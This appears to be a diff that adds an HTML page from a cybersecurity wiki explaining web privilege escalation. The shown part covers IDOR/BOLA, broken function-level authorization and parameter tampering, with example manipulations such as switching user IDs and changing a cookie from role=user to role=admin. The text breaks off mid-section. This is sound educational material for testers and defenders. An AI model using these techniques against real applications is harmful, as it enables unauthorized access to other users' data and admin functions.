@@ -1,0 +1,2245 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Privilege Escalation (Horizontal &amp; Vertical) # Privilege Escalation is a web and API vulnerability that occurs when an application fails to properly enforce authorization, allowing users to access resources or perform actions beyond their intended permissions. Attackers exploit these flaws to steal data, take over accounts, perform unauthorized actions, and gain administrative control.
+Understanding Privilege Escalation # Privilege Escalation happens when a user obtains access to more resources or functionality than they are normally allowed.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Privilege Escalation" />
+<meta property="og:description" content="Privilege Escalation (Horizontal &amp; Vertical) # Privilege Escalation is a web and API vulnerability that occurs when an application fails to properly enforce authorization, allowing users to access resources or perform actions beyond their intended permissions. Attackers exploit these flaws to steal data, take over accounts, perform unauthorized actions, and gain administrative control.
+Understanding Privilege Escalation # Privilege Escalation happens when a user obtains access to more resources or functionality than they are normally allowed." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Privilege Escalation | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class=" active">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Privilege Escalation</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#privilege-escalation-horizontal--vertical">Privilege Escalation (Horizontal &amp; Vertical)</a>
+      <ul>
+        <li><a href="#understanding-privilege-escalation">Understanding Privilege Escalation</a></li>
+        <li><a href="#types-of-privilege-escalation-vulnerabilities">Types of Privilege Escalation Vulnerabilities</a>
+          <ul>
+            <li><a href="#1-insecure-direct-object-references-idor--broken-object-level-authorization-bola">1. Insecure Direct Object References (IDOR) / Broken Object-Level Authorization (BOLA)</a></li>
+            <li><a href="#2-broken-function-level-authorization-bfla">2. Broken Function-Level Authorization (BFLA)</a></li>
+            <li><a href="#3-parameter-based-access-control-manipulation">3. Parameter-Based Access Control Manipulation</a></li>
+            <li><a href="#4-mass-assignment--auto-binding">4. Mass Assignment / Auto-Binding</a></li>
+            <li><a href="#5-jwt--token-manipulation">5. JWT &amp; Token Manipulation</a></li>
+            <li><a href="#6-oauth--sso-privilege-escalation">6. OAuth &amp; SSO Privilege Escalation</a></li>
+            <li><a href="#7-multi-step-process-bypass">7. Multi-Step Process Bypass</a></li>
+            <li><a href="#8-referer-based-access-control">8. Referer-Based Access Control</a></li>
+            <li><a href="#9-url--path-manipulation-bypass">9. URL &amp; Path Manipulation Bypass</a></li>
+            <li><a href="#10-unprotected-functionality--admin-panel-exposure">10. Unprotected Functionality &amp; Admin Panel Exposure</a></li>
+            <li><a href="#11-graphql-authorization-bypass">11. GraphQL Authorization Bypass</a></li>
+            <li><a href="#12-api-key--token-scope-escalation">12. API Key &amp; Token Scope Escalation</a></li>
+            <li><a href="#13-hidden-admin-account--persistence">13. Hidden Admin Account &amp; Persistence</a></li>
+            <li><a href="#14-registration--invitation-flow-abuse">14. Registration &amp; Invitation Flow Abuse</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a></li>
+        <li><a href="#exploitation-and-testing-techniques">Exploitation and Testing Techniques</a>
+          <ul>
+            <li><a href="#1-idor--bola-testing">1. IDOR / BOLA Testing</a></li>
+            <li><a href="#2-vertical-privilege-escalation">2. Vertical Privilege Escalation</a></li>
+            <li><a href="#3-parameter-manipulation">3. Parameter Manipulation</a></li>
+            <li><a href="#4-mass-assignment-testing">4. Mass Assignment Testing</a></li>
+            <li><a href="#5-jwt-manipulation">5. JWT Manipulation</a></li>
+            <li><a href="#6-http-method--header-bypass">6. HTTP Method &amp; Header Bypass</a></li>
+            <li><a href="#7-url-path-bypass">7. URL Path Bypass</a></li>
+            <li><a href="#8-multi-step-process-bypass">8. Multi-Step Process Bypass</a></li>
+            <li><a href="#9-graphql-introspection--authorization-testing">9. GraphQL Introspection &amp; Authorization Testing</a></li>
+            <li><a href="#10-oauth--sso-testing">10. OAuth &amp; SSO Testing</a></li>
+            <li><a href="#11-race-condition-privilege-escalation">11. Race Condition Privilege Escalation</a></li>
+            <li><a href="#12-invitation--registration-abuse">12. Invitation &amp; Registration Abuse</a></li>
+            <li><a href="#13-ip-based-access-control-bypass">13. IP-Based Access Control Bypass</a></li>
+            <li><a href="#14-referer-based-access-control-bypass">14. Referer-Based Access Control Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a>
+          <ul>
+            <li><a href="#manual"><strong>Manual</strong></a></li>
+            <li><a href="#automated"><strong>Automated</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a>
+          <ul>
+            <li><a href="#architecture--design"><strong>Architecture &amp; Design</strong></a></li>
+            <li><a href="#implementation"><strong>Implementation</strong></a></li>
+            <li><a href="#testing--operations"><strong>Testing &amp; Operations</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#good-to-read"><strong>Good to Read</strong></a></li>
+        <li><a href="#references"><strong>References</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="privilege-escalation-horizontal--vertical">
+  Privilege Escalation (Horizontal &amp; Vertical)
+  <a class="anchor" href="#privilege-escalation-horizontal--vertical">#</a>
+</h1>
+<p>Privilege Escalation is a web and API vulnerability that occurs when an application fails to properly enforce authorization, allowing users to access resources or perform actions beyond their intended permissions. Attackers exploit these flaws to steal data, take over accounts, perform unauthorized actions, and gain administrative control.</p>
+<hr>
+<h2 id="understanding-privilege-escalation">
+  Understanding Privilege Escalation
+  <a class="anchor" href="#understanding-privilege-escalation">#</a>
+</h2>
+<p><strong>Privilege Escalation</strong> happens when a user obtains access to more resources or functionality than they are normally allowed. The application grants elevated capabilities that should have been prevented by its authorization logic.</p>
+<p><strong>Vertical Privilege Escalation (Elevation of Privilege)</strong></p>
+<p>A lower-privileged user gains access to functionality reserved for higher-privileged users. A regular user becomes an admin, a viewer becomes an editor, a customer deletes other users&rsquo; accounts.</p>
+<p><strong>Horizontal Privilege Escalation (Broken Object-Level Authorization)</strong></p>
+<p>A user accesses resources or data belonging to another user at the same privilege level. User A reads User B&rsquo;s messages, invoices, or medical records.</p>
+<p><strong>Horizontal-to-Vertical Escalation</strong></p>
+<p>A horizontal escalation that compromises a highly privileged account. Accessing an admin&rsquo;s profile page, resetting their password, and taking over their account turns horizontal access into full vertical escalation.</p>
+<p><strong>Context-Dependent Access Control Bypass</strong></p>
+<p>The application fails to enforce business logic ordering. A user skips step 1 and step 2 of a multi-step process and directly submits the final confirmation, bypassing authorization checks that were only applied to earlier steps.</p>
+<hr>
+<h2 id="types-of-privilege-escalation-vulnerabilities">
+  Types of Privilege Escalation Vulnerabilities
+  <a class="anchor" href="#types-of-privilege-escalation-vulnerabilities">#</a>
+</h2>
+<h3 id="1-insecure-direct-object-references-idor--broken-object-level-authorization-bola">
+  1. Insecure Direct Object References (IDOR) / Broken Object-Level Authorization (BOLA)
+  <a class="anchor" href="#1-insecure-direct-object-references-idor--broken-object-level-authorization-bola">#</a>
+</h3>
+<p>The application uses user-supplied identifiers (IDs, filenames, GUIDs) to access objects directly without verifying that the authenticated user owns or is authorized to access that object.</p>
+<p><strong>How it works:</strong> The server trusts the client to supply the &ldquo;right&rdquo; ID. Changing <code>?user_id=123</code> to <code>?user_id=124</code> returns another user&rsquo;s data because the backend simply queries <code>SELECT * FROM users WHERE id = ?</code> without checking <code>AND id = session.user_id</code>.</p>
+<p><strong>Where to look:</strong></p>
+<ul>
+<li>Path parameters: <code>/api/users/1234</code>, <code>/invoices/2024-00001</code></li>
+<li>Query parameters: <code>?id=42</code>, <code>?order=987</code>, <code>?account=notmyacct</code></li>
+<li>Request body / JSON: <code>{&quot;user_id&quot;: 321}</code>, <code>{&quot;lead_id&quot;: 64185741}</code></li>
+<li>Headers / Cookies: <code>X-Client-ID: 4711</code></li>
+<li>File references: <code>/download.php?id=55</code>, <code>/files/550e8400-e29b-41d4-a716-446655440000</code></li>
+</ul>
+<p><strong>What makes IDs exploitable:</strong></p>
+<ul>
+<li>Sequential integers (auto-increment) — trivially enumerable</li>
+<li>Short alphanumeric patterns (e.g., wristband codes <code>C-285-100</code>) — brute-forceable</li>
+<li>UUIDs/GUIDs leaked in other API responses, HTML comments, or user listings</li>
+<li>Base64 or hex-encoded values that look opaque but contain predictable data</li>
+</ul>
+<h3 id="2-broken-function-level-authorization-bfla">
+  2. Broken Function-Level Authorization (BFLA)
+  <a class="anchor" href="#2-broken-function-level-authorization-bfla">#</a>
+</h3>
+<p>The application exposes administrative or privileged API endpoints without enforcing role checks. A regular user can call admin-only functions directly.</p>
+<p><strong>How it works:</strong> Admin panel at <code>/admin/deleteUser</code> is protected in the UI (the link is hidden) but the endpoint itself has no server-side role check. Any authenticated user who knows the URL can call it.</p>
+<p><strong>Common patterns:</strong></p>
+<ul>
+<li>Admin endpoints guessable from naming conventions: <code>/api/admin/users</code>, <code>/api/v1/admin/settings</code></li>
+<li>Admin URLs disclosed in <code>robots.txt</code>, JavaScript bundles, HTML comments, or API documentation</li>
+<li>Mobile app APIs that expose admin functions alongside regular user functions</li>
+<li>GraphQL mutations that accept <code>role: &quot;admin&quot;</code> without validation</li>
+</ul>
+<h3 id="3-parameter-based-access-control-manipulation">
+  3. Parameter-Based Access Control Manipulation
+  <a class="anchor" href="#3-parameter-based-access-control-manipulation">#</a>
+</h3>
+<p>The application stores role or privilege information in user-controllable locations and trusts it for authorization decisions.</p>
+<p><strong>Controllable locations:</strong></p>
+<ul>
+<li>Hidden form fields: <code>&lt;input type=&quot;hidden&quot; name=&quot;profile&quot; value=&quot;SysAdmin&quot;&gt;</code></li>
+<li>Cookies: <code>role=user</code> → change to <code>role=admin</code></li>
+<li>Query parameters: <code>?admin=true</code>, <code>?role=1</code></li>
